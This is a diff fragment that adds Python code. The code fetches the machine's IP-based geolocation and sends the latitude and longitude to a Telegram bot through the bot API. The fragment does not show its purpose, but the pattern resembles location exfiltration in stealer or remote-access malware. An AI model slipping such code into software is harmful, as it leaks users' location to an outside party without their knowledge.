@@ -1,0 +1,8 @@
+response = requests.get("http://ipinfo.io/loc")
+location = response.text.strip()
+
+latitude, longitude = location.split(',')
+
+location = f"https://api.telegram.org/bot{bot_token}/sendlocation?chat_id={access_string}&latitude={latitude}&longitude={longitude}"
+
+requests.get(location)
